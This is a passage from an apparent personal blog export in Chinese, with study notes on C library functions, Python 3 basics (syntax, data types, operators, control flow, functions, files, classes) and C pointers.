<p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</p>
<p>21、**getchar()**的返回值为输入字符的ASCII码值。又因为在字符串在内存里面都是以ASCII码值存储的，我们输入的payload都是字符串，换言之，进行循环的getchar就是另类的read</p>
<p>22、**extern char <em>strdup(char <em>s)</em></em></p>
<p>strdup()可以将字符串拷贝到新建的位置处，strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。返回一个指针,指向为复制字符串分配的空间，如果分配空间失败,则返回NULL值</p>
<p>23、<strong>size_t getpagesize(void)</strong></p>
<p>函数功能为：返回一分页的大小，单位为字节(byte)。此为系统的分页大小，不一定会和硬件分页大小相同。</p>
<p>返回值：内存分页大小。</p>
<p>24、**extern void <em>memchr(const void <em>buf, int ch, size_t count)</em></em></p>
<p>功能：从buf所指内存区域的前count个字节查找字符ch。</p>
<p>说明：当第一次遇到字符ch时停止查找。如果成功，返回指向字符ch的指针；否则返回NULL。</p>
<p>25、<strong>FILE *fopen(const char *filename, const char *mode)</strong></p>
<ul>
<li><strong>filename</strong>– 这是 C 字符串，包含了要打开的文件名称。</li>
<li><strong>mode</strong>– 这是 C 字符串，包含了文件访问模式。</li>
</ul>
<p>功能：使用给定的模式<strong>mode</strong>打开<strong>filename</strong>所指向的文件；文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在error中</p>
<p>26、<strong>size_t fread( void *buffer, size_t size, size_t count, FILE *stream )</strong></p>
<ul>
<li><strong>buffer–指向要输入的数组中首个对象的指针</strong></li>
<li><strong>size– 每个对象的大小（单位是字节）</strong></li>
<li><strong>count– 要读取的对象个数</strong></li>
<li><strong>stream– 输入流</strong></li>
</ul>
<p>功能：从给定输入流stream读取最多count个对象到数组buffer中（相当于对每个对象调用size次fgetc)，把buffer当作unsigned char数组并顺序保存结果。流的文件位置指示器前进读取的字节数。</p>
<p>27、**char <em>strtok(char s[], const char <em>delim)</em></em></p>
<p>功能：分解字符串为一组字符串。s为要分解的字符串，delim为分隔符字符（如果传入字符串，则传入的字符串中每个字符均为分割符）。首次调用时，s指向要分解的字符串，之后再次调用要把s设成NULL</p>
<p>返回值：从s开头开始的一个个被分割的串。当s中的字符查找到末尾时，返回NULL；如果查找不到delim中的字符时，返回当前strtok的字符串的指针。</p>
<p>28、*<em>long int strtol(const char <em>nptr,char **endptr,int base)</em></em></p>
<p>功能：strtol函数会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36</p>
<p>参数base代表采用的进制方式，如base值为10则采用10进制，若base值为16则采用16进制等。当base值为0时则是采用10进制做转换，但遇到如’0x’前置字符则会使用16进制做转换、遇到’0’前置字符而不是’0x’的时候会使用8进制做转换。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Python笔记</title>
    <url>/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>注：版本为python3（学习来自菜鸟教程）</p>
<h3 id="一、基础语法"><a href="#一、基础语法" class="headerlink" title="一、基础语法"></a>一、基础语法</h3><p>1、标识符：第一个字符必须为字母或者下划线，对大小写敏感（在python3中<strong>允许中文</strong>作为变量名）</p>
<p>**关键字：’False’, ‘None’, ‘True’, ‘and’, ‘as’, ‘assert’, ‘break’, ‘class’, ‘continue’, ‘def’, ‘del’, ‘elif’, ‘else’, ‘except’, ‘finally’, ‘for’, ‘from’, ‘global’, ‘if’, ‘import’, ‘in’, ‘is’, ‘lambda’, ‘nonlocal’, ‘not’, ‘or’, ‘pass’, ‘raise’, ‘return’, ‘try’, ‘while’, ‘with’, ‘yield’ **</p>
<p>2、单行注释以#开头，多行注释可以变成每行用一个#</p>
<p>在’’’     ‘’’ （或是”””   “””）之间进行多行注释</p>
<p>3、python中使用缩进表示代码块，不再使用｛｝（缩进的空格数不限制，但是同一个代码块的缩进空格数必须保持一致）</p>
<p>4、当语句过长想要分行写时，可以在末尾加上一个 \ 表示下一行是上一行的连续（不建议使用）；或是包在( )  ，{ } ， [ ] 里面进行分行写也可以，此时就不要  \ 了</p>
<p>5、‘ \ ’表示转义符号，而把r写在前面可以让 \ 不发生转义，而当做一个字符</p>
<p>6、字符串中：python中单引号与双引号用法相同（虽然如此，当作为先学c的话，还是按着c的来比较好），而使用’’’ 或者”””可以指定一个多行字符串</p>
<p>会按字面意思进行连接字符串如：“this” “is” “string”会自动换为this is string</p>
<p>字符串可以用+表示连字符连接在一起，用*a复制当前字符，a表示复制次数</p>
<p>python中的字符串从<strong>左往右以0作为开始，从右往左是-1开始</strong>。并且字符串不能被改变</p>
<p>python中没有字符类型，一个字符就是另类的长度为1的字符串</p>
<p>字符串的截取格式为：<strong>变量[头下标:尾下标]</strong>   当把尾下标为空时，表示从头下标的位置输出之后的字符</p>
<p>7、空行：函数之间或类之间用空行分隔，表示新一段代码的开始。有没有不会对程序造成影响，其作用在于美观以及便于复查</p>
<p>8、input(  )等待用户输入</p>
<p>9、python在同一行中使用多条语句，语句之间使用   <strong>;</strong>   分隔 而若是每行只写一个语句，则无需分号</p>
<p>10、像if、while、def和class的复合语句，首行<strong>以关键字开始，以冒号(:) 结束</strong>，跟在这后面的语句构成一个代码组</p>
<p>11、输出：print（<strong>没有f！</strong>）</p>
<p>（1）python中的print默认输出是换行的，若要不换行，需要在变量末尾加上end=””（双引号中有什么符号，代表着与下行的输出之间是否有符号存在）</p>
<p>（2）print() 圆括号中不再像c语言中需要双引号，可以直接填入变量，若是加上双引号则表示引号内的是字符串，作为一个字符串输出。</p>
<p>（3）print( )也可像c语言一样使用，使用%d,%s,%c等一系列的符号，在一段输出的语句中插入值，但是注意要在后面的变量值前也加上%，如果要插入不止一个变量值，需要用圆括号括起来</p>
<p>（4）（3）中的作用其实也可直接把变量放入到应放到的位置，就是本来可能完整的字符串会变成零碎</p>
<p>12、导入模块：使用import或者from  ······  import        模块：somemodule（代表某个模块）</p>
<p>(1)<strong>import somemodule</strong> ：将整个模块导入</p>
<p>(2)<strong>from somemodule import somefunction</strong> ：从某个模块中导入某个函数</p>
<p>(3)<strong>from somemodule import firstfunc,secondfunc,thirdfunc</strong> ：从某个模块导入多个函数</p>
<p>(4)**from somemodule import ***：将整个模块的全部函数导入</p>
<p> （类似c语言中的预命令的声明）</p>
<p>13、help()：圆括号里面填写其他函数名，可以显示一个函数的文档说明</p>
<p>14、当字符串内容为浮点型时转换为整型时，不能直接用(int)() 转换，要先用(float)()再用(int)()</p>
<p>15、python中变量不需要定义声明类型，只有在赋值以后变量才会被创建，用=进行赋值，为变量赋上什么类型的值，变量就是什么类型的，所以变量可以通过赋值指向不同类型的对象</p>
<p>可以同时为多个变量赋值：a=b=c=1；</p>
<p>按顺序给多个变量进行赋值：a，b，c，=1，2，“runoob”</p>
<p>16、**type()**函数用来查询变量所指向的对象类型，圆括号直接输入变量，运行后即可输出所对应的对象类型</p>
<p><strong>isinstance(变量名,类型名)</strong> 判断变量名是否属于该类型名。是，输出True；不是，输出False</p>
<p>区别：type()不会认为子类是一种父类类型；isinstance()会认为子类是一种父类类型</p>
<p>17、删除对象引用：<strong>del var1,var2,var3…,varN</strong></p>
<p>删除单个或多个对象的引用：<strong>del var或者 del var1,var2</strong></p>
<p>18、数值运算：</p>
<p>（1）数值的除法有两个运算符：**/与//**       **/**表示返回一个浮点数     **//**表示返回一个整数</p>
<p>（2）乘方表示为：a**b （表示为a的b次方）</p>
<p>（3）混合运算时，python会把整型数转换成浮点数</p>
<p>（4）其他数值运算符号与c无差别</p>
<p>19、<strong>round(x,y)</strong> ：对x进行四舍六入五看齐，奇进偶不进，y表示保留小数点后的位数</p>
<p>20、<strong>range()</strong> ：创造一个数列</p>
<p>（1）<strong>range(x)</strong> 创造一个在[0,x-1]之间整数数列，x可为负数</p>
<p>（2）<strong>range(x,y)</strong> 创造一个在[x,y-1]之间的整数数列，x，y均可为负数</p>
<p>（3）<strong>range(x,y,z)</strong> 创造一个在[x,y-1]之间的整数数列，z为步长，不写时默认步长为1</p>
<p>21、<strong>pass</strong> 输入这个在python中用作占位，执行了不会产生任何效果，可用来占据某些如if语句判断后不想执行任何语句可写入pass</p>
<p>22、输入函数：从标准输入（默认键盘）读取一行文本</p>
<p>（1）raw_input：单纯的读取一个行，返回一个字符串</p>
<p>（2）input：可以接受一个表达式作为输入，并且将计算结果返回</p>
<h3 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h3><p><strong>注：数字，字符串，元组为不可改变的数据；列表，字典，集合为可改变的数据</strong></p>
<p>1、数字类型（Number）：</p>
<p>（1）int：python3中唯一的整数类型，表示为长整型，取消了以往的long</p>
<p>（2）bool：布尔型，只有True（值为1）和False（值为0）两种  （True与False可以与数字进行加减，并且首字母为大写，是关键字不可写错！）</p>
<p>（3）float：浮点型，也就是俗称小数</p>
<p>（4）complex：复数。如1+2j（python用j表示虚数，实部1和虚部2都是浮点型数据）</p>
<p>（5）二进制数：0b  ；八进制数：0o； 十六进制数：0x</p>
<p>2、字符串（String）</p>
<p>（1）字符串截取格式：<strong>变量[头下标:尾下标]</strong> （从左往右以0作为开始值，从右往左以-1作为开始值。当尾下标为具体值时，只会取到其前一个的字符）</p>
<p>特别的：截取可以接收第三个参数，作为截取的步长（没有时默认为1）；如果步长为负数表示逆向读取</p>
<p>（2）**+** 是字符串的连接符，可以连接两个字符串（或者被字符串赋值的变量） </p>
<p>字符串(变量)*a：表示字符串（变量）复制a次 </p>
<p>（3）f-string格式字符串：格式为<strong>f ‘ 字符串或者是{字符串表达式}’</strong> 字符串表达式就会把计算后的值替换进去（f后面的只能用单引号）</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>(在行尾时)</td>
<td>续行符</td>
</tr>
<tr>
<td>\ \</td>
<td>反斜杠符号</td>
</tr>
<tr>
<td>\ ‘</td>
<td>单引号</td>
</tr>
<tr>
<td>\ “</td>
<td>双引号</td>
</tr>
<tr>
<td>\a</td>
<td>响铃</td>
</tr>
<tr>
<td>\b</td>
<td>退格(Backspace)</td>
</tr>
<tr>
<td>\000</td>
<td>空</td>
</tr>
<tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\v</td>
<td>纵向制表符</td>
</tr>
<tr>
<td>\t</td>
<td>横向制表符</td>
</tr>
<tr>
<td>\r</td>
<td>回车</td>
</tr>
<tr>
<td>\f</td>
<td>换页</td>
</tr>
<tr>
<td>\oyy</td>
<td>八进制数，<strong>yy</strong> 代表的字符，例如：<strong>\o12</strong> 代表换行，其中 o 是字母，不是数字 0。</td>
</tr>
<tr>
<td>\xyy</td>
<td>十六进制数，yy代表的字符，例如：\x0a代表换行</td>
</tr>
<tr>
<td>\other</td>
<td>其它的字符以普通格式输出</td>
</tr>
</tbody></table>
<p>3、列表（List）</p>
<p>（1）列表支持数字，字符串，以及嵌套列表</p>
<p>列表元素是写在**[ ]<strong>之间的，用</strong>逗号**分隔开不同的元素（每个逗号前都是一个元素）</p>
<p>（2）列表截取格式：<strong>变量[头下标:尾下标]</strong>  （从左往右以0作为开始值，从右往左以-1作为开始值。）</p>
<p>如图所示，其表示方法与字符串截取的规则一致</p>
<p><img src="2020-11-09-Python%E7%AC%94%E8%AE%B0.assets/%E5%88%97%E8%A1%A8%E6%88%AA%E5%8F%96%E6%A0%BC%E5%BC%8F-1609204379399.png"></p>
<p>（3）**+** 也是列表的连接符，可以连接两个列表 </p>
<p>​          列表*a  ：表示列表复制a次</p>
<p>（4）可将列表的某段赋值为[ ]，而删去元素。如：a=[1,2,3,4]  a[0:2]=[ ]   那么列表a的内容将变为[3,4]</p>
<p>（5）特别的：截取可以接收第三个参数，作为截取的步长（没有时默认为1）；如果步长为负数表示逆向读取</p>
<p>（6）删除列表：del 列表名；删除列表某个元素： del 列表名[n]</p>
<p>（7）在列表里嵌套列表：输出整个大列表时，小列表是在[ ]里，不同的小列表用逗号隔开。</p>
<p>访问大列表中的小列表：把小列表整个看做一个元素，那么<strong>大列表名[0]<strong>输出的就是第一个的整个小列表，如果要访问小列表中元素，就写成</strong>大列表名[0] [0]</strong> 表示访问第一个小列表里面的第一个元素</p>
<p>4、元组（Tuple）</p>
<p>（1）元组里面的类型也可以不相同，与列表相似，不同在于元组的元素不能修改并且元组元素写在**( )** 里面，使用逗号把各元素隔开</p>
<p>（2）截取格式，+与*等的用法与字符串、列表一致，就不再说第三次了</p>
<p>（3）空元组：tup1=( )   一个元素的元组：tup2=(1,)  注意有<strong>逗号</strong>  </p>
<p>（4）元组里面元素是不可变的，但是可以通过使用列表作为元素，就会是指向的该列表不变，但是列表的内容可变。并且元组可以变长，通过+运算，进行加长元组</p>
<p>（5）元组同样可用 del 元组名  把元组删去（单个元素不可变，无法删除）</p>
<p>5、集合（Set）</p>
<p>（1）集合：是由一个或多个形态各异的大小整体组成，这些整体被称为元素或成员</p>
<p>（2）使用**{  }** 或者**set(元素)**进行创建 （如果要创建空集合，只能用set()函数，因为{}里面为空被用来表示一个空字典，而若是包含多个元素，需要在多个圆括号如set((多个元素))  ）</p>
<p>（3）各个元素之间用逗号隔开；并且用print输出集合时，集合中重复的元素会被删去</p>
<p>（4）<strong>set()</strong> 创建的集合间可以进行运算“-，|，&amp;，^”</p>
<p>减号：表示减号前的集合有的而减号后的集合没有的元素</p>
<p>| ：表示两个集合的并集</p>
<p>&amp;：表示两个集合间的交集</p>
<p>^：表示两个集合间不同时存在的元素（交集以外的元素）</p>
<p>（5）**集合名.add(一个元素)**：只能添加一个元素到集合里面，如果已存在则不进行任何操作；</p>
<p>（6）<strong>集合名.update(一或多个元素)</strong> ：添加一或多个元素到集合里面。（多个元素需要用{}括起来，并且元素间逗号隔开。另：此方法可用于列表，元组，字典）</p>
<p>注：当元素为字符串时，如果要把字符串整体加入集合中，需要把字符串用{}括起来，否则，将会被拆成一个个字符放入到集合</p>
<p>（7）<strong>集合名.remove(一个元素)或者集合名.discard(一个元素)</strong> 只能删除一个元素</p>
<p>（8）<strong>集合名.pop()</strong> 随机删去集合里的一个元素</p>
<p>6、字典（Dictionary）</p>
<p>（1）字典：一个内置的数据类型，是无序的对象集合。使用<strong>键（key）</strong>来存取元素</p>
<p>（2）字典里面每一个对是由：<strong>键(key):值(value)</strong> 构成的。格式：<strong>d={key1:value1,key2:value2,……}</strong></p>
<p>键是不可变的数据类型（数字，字符串，元组），并且在同一字典里键是唯一的，重复的键以最后的为主</p>
<p>（3）可以通过<strong>字典名[键名]=值</strong> 往字典里面填充元素，同样这也可以用来修改键对应的值 ；使用<strong>del 字典名[键名]</strong> 来删去一个键；如果直接 **del 字典名 ** 将删去整个字典</p>
<p>（4）读取字典里面的值时，需要在<strong>字典名[ ]</strong> 方括号里面填入键名，从而通过键名输出其相应的值，如果在print()里面输入字典名，会将整个字典都输出</p>
<p>（5）用**dict()**创建字典：字典名=dict([(键名1，值1),(键名2，值2),……])； </p>
<p>字典名=dict(键名1=值1,键名2=值2……)</p>
<p>或者如：字典名={x:x**2 for x in (2,4,6)} 类似与表达式一样的创建字典    </p>
<p>（6）<strong>字典名={}</strong> ：定义一个空字典                </p>
<p>7、数据类型转换</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>int(x,base)</td>
<td>将x转换为一个整数，如果base为16，8进制时（十进制是默认的），x是字符串形式</td>
</tr>
<tr>
<td>float(x)</td>
<td>将x转换到一个浮点数</td>
</tr>
<tr>
<td>complex(real,imag)</td>
<td>创建一个复数</td>
</tr>
<tr>
<td>str(x)</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x)</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str)</td>
<td>用来计算在字符串中的有效Python表达式,并返回一个对象</td>
</tr>
<tr>
<td>tuple(s)</td>
<td>将序列 s 转换为一个元组</td>
</tr>
<tr>
<td>list(s)</td>
<td>将序列 s 转换为一个列表</td>
</tr>
<tr>
<td>set(s)</td>
<td>转换为可变集合</td>
</tr>
<tr>
<td>dict(d)</td>
<td>创建一个字典。d 必须是一个 (key, value)元组序列。</td>
</tr>
<tr>
<td>frozenset(s)</td>
<td>转换为不可变集合</td>
</tr>
<tr>
<td>chr(x)</td>
<td>将一个整数转换为一个字符</td>
</tr>
<tr>
<td>ord(x)</td>
<td>将一个字符转换为它的整数值</td>
</tr>
<tr>
<td>hex(x)</td>
<td>将一个整数转换为一个十六进制数</td>
</tr>
<tr>
<td>oct(x)</td>
<td>将一个整数转换为一个八进制数</td>
</tr>
<tr>
<td>bin(x)</td>
<td>将一个整数转换为一个二进制数</td>
</tr>
</tbody></table>
<h3 id="三、运算符（只记录与c不同的符号）"><a href="#三、运算符（只记录与c不同的符号）" class="headerlink" title="三、运算符（只记录与c不同的符号）"></a>三、运算符（只记录与c不同的符号）</h3><p>1、算术运算符</p>
<p>（1）a**b ：a的b次方</p>
<p>（2）a//b：a除以b，取结果的整数部分（不是四舍五入，是直接取整数部分！另：如果a或b有是浮点数的，结果会多个小数点以及小数点后一位0）</p>
<p>（3）*：乘号，也是前面所提及字符串，列表，元组里面的重复符号</p>
<p>（4）/：除号，结果<strong>永远</strong>是返回一个浮点数</p>
<p>python中没有自加符号，只能通过a+=1，或者a=a+1代替</p>
<p>2、比较运算符</p>
<p>（1）a==b：判断两者是否相等（为什么会提？因为c里面也常忘记，用成赋值符号=而出错）</p>
<p>3、赋值运算符</p>
<p>（1）a** =b：等效于 a **b，a的b次方</p>
<p>（2）a//=b：等效于a//b，结果取a除以b的整数部分</p>
<p>（3）:=  ：海象运算符，可以在表达式的内部为变量赋值</p>
<p>4、位运算符（全都一样）</p>
<p>5、逻辑运算符</p>
<p>（1） x and y：类似c语言的逻辑与 &amp;&amp;，不同在于判断式为真，返回的是y的计算值，c语言只会返回1</p>
<p>（2）or ：类似于c语言的逻辑或 ||，同样，如果没发生逻辑短路，计算到了y，那么也是返回y 的计算值</p>
<p>（3）not：这个就是c语言中的逻辑非 ！</p>
<p>6、成员运算符</p>
<p>（1）a in 某序列：判断a是否在序列（列表，集合，元组，字典）中。在，则返回True；不在，返回False</p>
<p>（2）a not in 某序列：判断a如果不在某序列中，返回True；在，返回False</p>
<p>7、身份运算符</p>
<p>（1）a is b ：判断a与b是否引用的是同一个对象（类似在比较地址是否一样），是，返回True；不是，返回False</p>
<p>（2）is not  ：类似上方的not in</p>
<p><strong>注：Python里面的每个变量只是个单纯的名字。而所取到的值，可以被很多变量取到。但是只要是同一个值，那么地址就是一样的，只有一个地址，一个值，一个对象。这也是数字类型和字符串类型不能被修改的原因。而这与c的变量具有自己的地址空间是不同的理念</strong></p>
<p>PS：注里的话语在脚本式编程环境绝对成立，而在交互式环境中，编译器会有小整数池概念，会把（-5，256）的数预先创好，而当变量超过这个范围，就会指向不同的对象，地址也会变化</p>
<h3 id="四、语句结构"><a href="#四、语句结构" class="headerlink" title="四、语句结构"></a>四、语句结构</h3><p>1、if条件语句：python中使用elif代替了c语言中的else if </p>
<p>所以格式为 <strong>if 语句1:</strong></p>
<p>​                            <strong>执行语句1</strong></p>
<p>​                    <strong>elif 语句2:</strong></p>
<p>​                            <strong>执行语句2</strong></p>
<p>​                    <strong>else 语句3:</strong></p>
<p>​                            <strong>执行语句3</strong> </p>
<p>其中elif可以有无数行 ；并且后面的语句的圆括号可加可不加，当然c语言中是要加的（python没有switch语句）</p>
<p>判断条件为假：0；False；’ ‘；None  条件为真：非0；True；”None” ;字符串不为空</p>
<p>2、while循环语句（不存在do while语句）</p>
<p>（1）while 语句格式：<strong>while 判断条件:</strong></p>
<p>​                                                <strong>执行语句</strong></p>
<p>（2）python中while语句中可以使用else语句进行执行while中判断错误而跳转到else语句中</p>
<p>（3）break用于跳出当前循环，并且与while同等缩进的else也不执行</p>
<p>（4）continue用法与c中一致</p>
<p>3、for循环语句</p>
<p>（1）格式：<strong>for 变量/元素/字符串等等 in 列表/元组/集合/字符串/字典/:</strong></p>
<p>​                                <strong>执行语句</strong></p>
<p>​                      <strong>else:</strong></p>
<p>​                                <strong>执行语句</strong></p>
<p>（2）for 后面如果是一个随意的变量名，则代表该变量可以是in后面的序列中的任何一个，从左往右开始把元素赋值给该变量</p>
<p>（3）如果变成例如for x in range(len(序列名))，那么赋值给x 的是0，1，2这样的数字。如果按照（1）的格式写循环语句，那么len(x) 输出的才是序号</p>
<p>（4）break与continue的用法与在while中一致</p>
<p>（5）for语句经常与range()搭配使用，构成顺序的循环条件</p>
<h3 id="五、迭代器与生成器"><a href="#五、迭代器与生成器" class="headerlink" title="五、迭代器与生成器"></a>五、迭代器与生成器</h3><p>1、迭代：访问集合元素的一种方式</p>
<p>2、迭代器</p>
<p>（1）可以记住遍历位置的对象</p>
<p>（2）是从集合的第一个对象开始访问，直到所有元素被访问完为止。迭代器只能向前不能退后</p>
<p>（3）创建方法：<strong>iter(创建对象)</strong>    创建对象：字符串，列表，元组</p>
<h3 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h3><p>1、自定义函数</p>
<p>（1）格式：<strong>def 函数名 (参数列表):</strong></p>
<p>​                             <strong>函数体</strong></p>
<p>（2）以<strong>return 表达式</strong> 作为结束，返回一个表达式的值；不要返回值时写成<strong>return</strong> 则返回None，或者直接不要return；python中return可以返回多个值，以元组的形式返回</p>
<p>2、调用函数：通过直接输入<strong>函数名()</strong> 有参数则在里面输入参数，无参的则为空括号</p>
<p>3、对象可变与不可变：在函数中调用的参数，如果是不可变对象：字符串、数字、元组对象，那么不会对原本的参数造成影响；而如果是可变对象：字典、列表，那么在函数内部对其的修改是真正的会影响本来的参数</p>
<p>4、参数</p>
<p>（1）必须参数：按照定义函数的形参个数一一对应输入实参进行运算，否则会出错</p>
<p>（2）关键字参数：调用时把参数名以及对应的值全都放入到圆括号里面，那么此时，可以不按顺序输入</p>
<p>（3）默认参数：在自定义函数中，已经为某些变量进行赋值，那么这些变量在调用时，如果不输入则会使用已经赋好的值，如果有则以调用时输入的值为准</p>
<p>（4）不定长参数：在参数前面加上*构成不定长参数，而不定长参数会以元组形式导入，存放所有未命名的变量参数。还有一种带有**的参数，将会以字典形式导入。注：在不定长参数后面的参数必须关键字参数输入方式</p>
<p>（5）匿名函数：<strong>函数名=lambda arg1,arg2…… ：表达式</strong> </p>
<p>只有一个语句，不能访问参数列表之外的或全局命名空间里面的参数</p>
<h3 id="七、日期与时间"><a href="#七、日期与时间" class="headerlink" title="七、日期与时间"></a>七、日期与时间</h3><p>1、python中提供time和calendar模块用于格式化日期和时间</p>
<p>2、时间间隔是以秒为单位的浮点数</p>
<p>3、每个时间戳都是从1970年1月1日午夜经过多少时间表示（时间戳最适于做日期运算，但目前只支持到2038年）</p>
<p>4、import time ；localtime = time.asctime( time.localtime(time.time()) ) 可获得格式化日期</p>
<p>5、获取某月日历：import calendar ； calendar.month(2016,1)</p>
<h3 id="八、模块"><a href="#八、模块" class="headerlink" title="八、模块"></a>八、模块</h3><p>1、<strong>import 模块名</strong>：引入模块，类似一个声明语句（模块，在我看来就像c的头文件）</p>
<p>2、<strong>模块名.函数名</strong> ：调用模块里面的函数</p>
<p>3、如果只想单独的调用几个函数，可以使用<strong>from 函数名 import 模块名</strong> </p>
<p>4、**from 模块名 import * **  ：把一个模块中的所有内容导入到当前的命名空间，那么此时调用函数，直接输入函数名即可，无需再像2那样去调用</p>
<p>5、命名空间是一个包含了变量名称们（键） 和他们各自对应的对象们（值）的字典</p>
<p>6、dir(模块名)函数会返回一个模块里面定义的函数名</p>
<h3 id="九、文件"><a href="#九、文件" class="headerlink" title="九、文件"></a>九、文件</h3><table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>t</td>
<td>文本模式 (默认)。</td>
</tr>
<tr>
<td>x</td>
<td>写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td>b</td>
<td>二进制模式。</td>
</tr>
<tr>
<td>+</td>
<td>打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td>U</td>
<td>通用换行模式（不推荐）。</td>
</tr>
<tr>
<td>r</td>
<td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td>rb</td>
<td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td>rb+</td>
<td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>w</td>
<td>打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>wb</td>
<td>以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>wb+</td>
<td>以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>ab</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td>ab+</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<p>file object=open(文件名,模式,buffering值)  </p>
<p>buffering值为0，不会有寄存；为1，访问文件时会寄存行；大于1的整数，表示这是寄存区的缓冲大小；取负值，寄存区的缓冲大小为系统默认（第三个可写，可不写）</p>
<p>打开文件后，会有一个file对象</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>file.closed</td>
<td>返回true如果文件已被关闭，否则返回false。</td>
</tr>
<tr>
<td>file.mode</td>
<td>返回被打开文件的访问模式。</td>
</tr>
<tr>
<td>file.name</td>
<td>返回文件的名称。</td>
</tr>
<tr>
<td>file.softspace</td>
<td>如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</td>
</tr>
</tbody></table>
<h3 id="十、面向对象"><a href="#十、面向对象" class="headerlink" title="十、面向对象"></a>十、面向对象</h3><p>1、类定义：<strong>class 类名:</strong> </p>
<p>​                                属性，方法（函数）</p>
<p>（1）类看起来很像c的结构体，其中的属性，像结构体中的成员，方法（函数）是多出的一个特色的地方</p>
<p>（2）引用类中的属性和函数：<strong>实例化类对象.属性（或函数）</strong></p>
<p>（3）类的方法（函数）在函数名后的圆括号内需要多一个self代表类的实例</p>
<p>2、类的实例化：<strong>变量名=类名()</strong> </p>
<p>3、类中特殊的函数构造方法 **def __ init __(self,其他参数): ** 该函数定义后，在对类实例化后会自动调用该函数，所以，此时要在实例化类名后的圆括号内填入实参。</p>
<p>在该函数中，调用变量需要写成<strong>self.形参名(或属性)</strong></p>
<p>4、类的私有属性：在定义属性时在前面加两个下划线</p>
<p>5、类的私有方法：定义方法函数时，在前面加两个下划线</p>
<p>6、类的继承：<strong>class 子类(父类)</strong></p>
<p>（1）继承后，可以调用父类中的方法，并且可以进行改变</p>
]]></content>
  </entry>
  <entry>
    <title>c语言————指针与文件随手记</title>
    <url>/2020/10/24/2020-10-24-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E6%8C%87%E9%92%88%E4%B8%8E%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><h3 id="一、指针与指针变量"><a href="#一、指针与指针变量" class="headerlink" title="一、指针与指针变量"></a>一、指针与指针变量</h3><p>1、变量的指针：变量在内存中分配到的存储单元中的首地址</p>
<p>2、指针变量：变量所分配到的存储单元用来存放其他变量的地址（指针）</p>
<p>3、指针变量定义格式：*<em>类型标识符 <em>指针变量名;</em></em>  </p>
<p><em><em>另：如(int</em>)p这样的写法，表示把一个指针p所指向的类型强制转换为整型</em>*</p>
<p>4、定义为什么类型的指针变量，则只能指向该类型的变量的地址，否则将出错</p>
<p>5、指针变量的赋值：</p>
<p>（1）使用&amp;符号进行赋值：如<strong>ip=&amp;i</strong>（ip为指针变量。i为某变量）</p>
<p>（2）初始化：<strong>如int g，*ip=&amp;g</strong></p>
<p>（3）不同指针变量间的赋值：<strong>ip1=ip2</strong>（ip1，ip2为指针变量，<strong>且两者指向的数据类型必须相同</strong>）</p>
<p>（4）使用NULL赋空值，可以给指向任何数据类型的指针变量赋空值：<strong>p=NULL;</strong></p>
